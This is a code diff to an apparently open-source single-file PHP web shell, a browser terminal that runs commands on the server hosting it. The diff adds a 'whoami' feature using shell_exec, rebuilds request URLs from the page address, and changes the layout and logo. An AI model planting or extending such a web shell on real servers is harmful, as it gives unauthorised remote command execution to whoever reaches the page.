@@ -75,6 +75,15 @@ function featureUpload($path, $file, $cwd) {
     }
 }
 
+function featureWhoami() {
+    $user = trim(shell_exec("whoami"));
+    $host = trim(gethostname());
+    return array(
+        "user" => $user ? $user : "php",
+        "host" => $host ? $host : "localhost",
+    );
+}
+
 if (isset($_GET["feature"])) {
 
     $response = NULL;
@@ -95,6 +104,10 @@ if (isset($_GET["feature"])) {
             break;
         case 'upload':
             $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
+            break;
+        case 'whoami':
+            $response = featureWhoami();
+            break;
     }
 
     header("Content-Type: application/json");
@@ -121,7 +134,7 @@ if (isset($_GET["feature"])) {
 
             #shell {
                 background: #222;
-                max-width: 800px;
+                max-width: 1000px;
                 margin: 50px auto 0 auto;
                 box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                 font-size: 10pt;
@@ -131,7 +144,7 @@ if (isset($_GET["feature"])) {
             }
 
             #shell-content {
-                height: 500px;
+                height: 600px;
                 overflow: auto;
                 padding: 5px;
                 white-space: pre-wrap;
@@ -217,6 +230,7 @@ if (isset($_GET["feature"])) {
             var historyPosition = 0;
             var eShellCmdInput = null;
             var eShellContent = null;
+            var eShellPromptPrefix = "php@shell";
 
             function _insertCommand(command) {
                 eShellContent.innerHTML += "\n\n";
@@ -240,7 +254,9 @@ if (isset($_GET["feature"])) {
                     // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                     eShellContent.innerHTML = '';
                 } else {
-                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
+                    var url = new URL(window.location.href);
+                    url.searchParams.set("feature", "shell");
+                    makeRequest(url.href, {cmd: command, cwd: CWD}, function (response) {
                         if (response.hasOwnProperty('file')) {
                             featureDownload(response.name, response.file)
                         } else {
@@ -274,8 +290,10 @@ if (isset($_GET["feature"])) {
                 var type = (currentCmd.length === 1) ? "cmd" : "file";
                 var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];
 
+                var url = new URL(window.location.href);
+                url.searchParams.set("feature", "hint");
                 makeRequest(
-                    "?feature=hint",
+                    url.href,
                     {
                         filename: fileName,
                         cwd: CWD,
@@ -305,7 +323,9 @@ if (isset($_GET["feature"])) {
                 element.addEventListener('change', function () {
                     var promise = getBase64(element.files[0]);
                     promise.then(function (file) {
-                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
+                        var url = new URL(window.location.href);
+                        url.searchParams.set("feature", "upload");
+                        makeRequest(url.href, {path: path, file: file, cwd: CWD}, function (response) {
                             _insertStdout(response.stdout.join("\n"));
                             updateCwd(response.cwd);
                         });
@@ -315,6 +335,16 @@ if (isset($_GET["feature"])) {
                 });
                 element.click();
                 document.body.removeChild(element);
+            }
+            
+            function featureWhoami() {
+                var url = new URL(window.location.href);
+                url.searchParams.set("feature", "whoami");
+                makeRequest(url.href, {}, function (response) {
+                    if (response.hasOwnProperty('user') && response.hasOwnProperty('host')) {
+                        eShellPromptPrefix = response.user + "@" + response.host;
+                    }
+                });
             }
 
             function getBase64(file, onLoadCallback) {
@@ -333,7 +363,7 @@ if (isset($_GET["feature"])) {
                     var splittedCwd = cwd.split("/");
                     shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
-                return "php@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
+                return eShellPromptPrefix + ":<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
 
             function updateCwd(cwd) {
@@ -342,7 +372,9 @@ if (isset($_GET["feature"])) {
                     _updatePrompt();
                     return;
                 }
-                makeRequest("?feature=pwd", {}, function(response) {
+                var url = new URL(window.location.href);
+                url.searchParams.set("feature", "pwd");
+                makeRequest(url.href, {}, function(response) {
                     CWD = response.cwd;
                     _updatePrompt();
                 });
@@ -430,6 +462,7 @@ if (isset($_GET["feature"])) {
             window.onload = function() {
                 eShellCmdInput = document.getElementById("shell-cmd");
                 eShellContent = document.getElementById("shell-content");
+                featureWhoami();
                 updateCwd();
                 eShellCmdInput.focus();
             };
@@ -439,12 +472,19 @@ if (isset($_GET["feature"])) {
     <body>
         <div id="shell">
             <pre id="shell-content">
-                <div id="shell-logo">Single-file PHP Shell</div>
+                <div id="shell-logo">
+ ____  _             _             __ _ _        ____  _   _ ____    ____  _          _ _ <span></span>
+/ ___|(_)_ __   __ _| | ___       / _(_) | ___  |  _ \| | | |  _ \  / ___|| |__   ___| | |<span></span>
+\___ \| | '_ \ / _` | |/ _ \_____| |_| | |/ _ \ | |_) | |_| | |_) | \___ \| '_ \ / _ \ | |<span></span>
+ ___) | | | | | (_| | |  __/_____|  _| | |  __/ |  __/|  _  |  __/   ___) | | | |  __/ | |<span></span>
+|____/|_|_| |_|\__, |_|\___|     |_| |_|_|\___| |_|   |_| |_|_|     |____/|_| |_|\___|_|_|<span></span>
+               |___/                                                                      <span></span>
+                </div>
             </pre>
             <div id="shell-input">
-                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
+                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">php@shell</label>
                 <div>
-                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
+                    <input id="shell-cmd" name="cmd" autocomplete="off" onkeydown="_onShellCmdKeyDown(event)"/>
                 </div>
             </div>
         </div>
